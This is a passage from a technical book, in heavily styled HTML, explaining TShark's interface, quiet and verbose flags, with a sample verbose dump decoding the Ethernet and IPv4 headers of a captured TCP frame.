New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-i</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag along with the interface you are interested in capturing on. The </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-i </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag is followed by either the specific interface or the number given by the list provided by the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-D </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag. If you do not specify an interface, TShark will begin capturing on the first non-loopback interface in the list. In the preceding example, the first non-loopback interface is </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >em1</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. So, to capture on that interface, you would type:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:240.4500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost:~$ tshark -i em1 Capturing on em1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Frame 1: 66 bytes on wire (528 bits), 66 bytes captured (528 bits)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.6000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >on interface 0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Often, when scripting with TShark, you don&#8217;t actually want to see all the packets that TShark is capturing because your script is already printing the data you want to see. Using the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-q </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag will suppress the majority of output so that you can clearly see the script output you are interested in. The reverse scenario is when you want to not just see what kinds of packets TShark is capturing but also the actual packet contents. Again, TShark provides the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-V </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag that will dump all the details of packets captured by TShark, as shown in the following example:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section128" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:316.5500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark257" ></a><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost:~$ tshark -V Capturing on em1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Frame 1: 66 bytes on wire (528 bits), 66 bytes captured (528 bits) on</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:22.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >interface 0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Interface id: 0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >WTAP_ENCAP: 1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Arrival Time: May 12, 2014 04:52:57.103458000</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >CDT</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[Time shift for this packet: 0.000000000</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >seconds]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Epoch Time: 1399888377.103458000 seconds</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[Time delta from previous captured frame:</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.2500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0.000000000 seconds]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[Time delta from previous displayed frame:</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.3000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0.000000000 seconds]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[Time since reference or first frame: 0.000000000 seconds] Frame Number: 1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Frame Length: 66 bytes (528 bits)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Capture Length: 66 bytes (528 bits) [Frame is marked: False]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:207.6000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[Frame is ignored: False] [Protocols in frame: eth:ip:tcp]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Ethernet II, Src: Alfa_6d:a0:65 (00:c0:ca:6d:a0:65), Dst: Tp-</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:323.8000pt;margin-left:22.3500pt;text-indent:-14.4000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >LinkT_eb:06:e8 (00:1d:0f:eb:06:e8)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:65.5500pt;text-indent:-28.8000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Destination: Tp-LinkT_eb:06:e8 (00:1d:0f:eb:06:e8) Address: Tp-LinkT_eb:06:e8 (00:1d:0f:eb:06:e8)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:22.3500pt;text-indent:43.1500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;. ..0. &#8230;. &#8230;. &#8230;. &#8230;. = LG bit: Globally unique address (factory default)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;. &#8230;0 &#8230;. &#8230;. &#8230;. &#8230;. = IG bit: Individual address (unicast) Source: Alfa_6d:a0:65 (00:c0:ca:6d:a0:65)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Address: Alfa_6d:a0:65 (00:c0:ca:6d:a0:65)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:22.3500pt;text-indent:43.1500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;. ..0. &#8230;. &#8230;. &#8230;. &#8230;. = LG bit: Globally unique address (factory default)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;. &#8230;0 &#8230;. &#8230;. &#8230;. &#8230;. = IG bit: Individual address (unicast) Type: IP (0x0800)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Internet Protocol Version 4, Src: 192.168.1.127</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >(192.168.1.127), Dst:</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:22.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >64.4.44.84 (64.4.44.84)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Version: 4</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Header length: 20 bytes</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Differentiated Services Field: 0x00 (DSCP 0x00: Default;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ECN: 0x00: Not-ECT</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >(Not ECN-Capable Transport))</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0000 00.. = Differentiated Services Codepoint: Default</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:12.7500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >(0x00)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;. ..00 = Explicit Congestion Notification: Not-ECT</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:207.6000pt;margin-left:36.7500pt;text-indent:-14.4000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >(Not ECN-Capable Transport) (0x00) Total Length: 52</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section129" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:229.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Identification: 0x46db (18139) Flags: 0x02 (Don't Fragment)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0&#8230; &#8230;. = Reserved bit: Not</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >.1.. &#8230;. = Don't fragment:</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:179.8500pt;margin-left:36.7500pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >..0. &#8230;. = More fragments: Not set Fragment offset: 0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:323.8000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Time to live: 64 Protocol: TCP (6)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:65.5500pt;text-indent:-28.8000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier 